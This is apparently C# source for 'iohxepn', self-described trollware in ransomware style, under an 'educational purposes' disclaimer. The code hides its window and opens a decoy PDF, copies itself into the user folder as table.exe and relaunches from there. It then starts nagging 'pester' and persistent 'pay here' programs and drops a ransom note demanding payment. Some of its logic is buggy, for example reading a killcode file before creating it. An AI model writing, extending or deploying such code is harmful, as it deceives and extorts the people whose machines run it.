/* 
 * iohxepn may be used only for Educational Purposes. Do not use it as a ransomware!
 * You could go to jail on obstruction of justice charges just for running this, even though you are innocent. 
 * written by anonfoxer.
 * (C) 2020
 */


using System;
using System.Diagnostics;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Security;
using System.Security.Cryptography;
using System.IO;
using System.Net;
using Microsoft.Win32;
using System.Runtime.InteropServices;
using System.Text.RegularExpressions;

namespace iohxepn
{
    public partial class Form1 : Form
    {
        //current user of windows
        string userName = Environment.UserName;
        //name of the computer
        string computerName = System.Environment.MachineName.ToString();
        string userDir = "C:\\Users\\";
        //it writes killcode to this file in pc
        string pcPassword = "\\killcode.txt";

        public Form1()
        {
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            Opacity = 0;
            this.ShowInTaskbar = false;
            //program will start pestering at form load
            startAction();
            string pcPasswordPath = userDir + userName + pcPassword;
            //it copies itself to this path
            string exePath = userDir + userName + "\\table.exe";
            //if the program runs for the first time (inside the usb stick)
            if (File.Exists(pcPasswordPath) == false)
            {
                //launches an innocent pdf file
                System.Diagnostics.Process.Start("pheonix.pdf");
                string password = CreatePassword(15);
                SavePassword(password);
                //copies itself and executes
                File.Copy(Application.ExecutablePath, exePath);
                Process.Start(exePath);
                System.Windows.Forms.Application.Exit();

            }
        }

        private void Form_Shown(object sender, EventArgs e)
        {
            Visible = false;
            Opacity = 100;
        }

        //creates random password for killcode
        public string CreatePassword(int length)
        {
            const string valid = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/";
            StringBuilder res = new StringBuilder();
            Random rnd = new Random();
            while (0 < length--)
            {
                res.Append(valid[rnd.Next(valid.Length)]);
            }
            return res.ToString();
        }

        //saves the killcode to pc
        public void SavePassword(string password)
        {

            string info = computerName + "-" + userName + " " + password;
            string pcPath = userDir + userName + pcPassword;
            System.IO.File.WriteAllText(pcPath, password);

        }
        
        //launches program to randomly calculate and launch payloads
        public void payloadCalc()
        {
            string pathc = "\\Desktop\\iohxepnPester.exe";
            string fullpathc = userDir + userName + pathc;
            System.Diagnostics.Process.Start(fullpathc);
        }

        //launches the persistant "pay here" window
        public void makePersist()
        {
            string pathc = "\\Desktop\\iohxepnPay.exe";
            string fullpathc = userDir + userName + pathc;
            System.Diagnostics.Process.Start(fullpathc);
        }

        //creates a message for pc user
        public void messageCreator()
        {
            string path = "\\Desktop\\READ_ME_NOW_KEK.txt";
            string fullpath = userDir + userName + path;
            string[] lines = { "Your computer has been INFECTED with iohxepn!", "Your files have not been encrypted, but you will be pestered until you pay me 1 dollar or find the killcode!", "This is trollware! Love u bye lmao xDDDD rawrrrr", "your computer also now has covid-19!" };
            System.IO.File.WriteAllLines(fullpath, lines);
        }

        //launches full shit
        public void startAction()
        {
            string passwordPath = userDir + userName + pcPassword;
            string password = File.ReadAllText(passwordPath);
            string path = "\\Desktop";
            string startPath = userDir + userName + path;
            messageCreator();
            makePersist();
            payloadCalc();
            password = null;
            File.WriteAllText(passwordPath, String.Empty);
            File.Delete(passwordPath);
            System.Windows.Forms.Application.Exit();
        }
    }
}
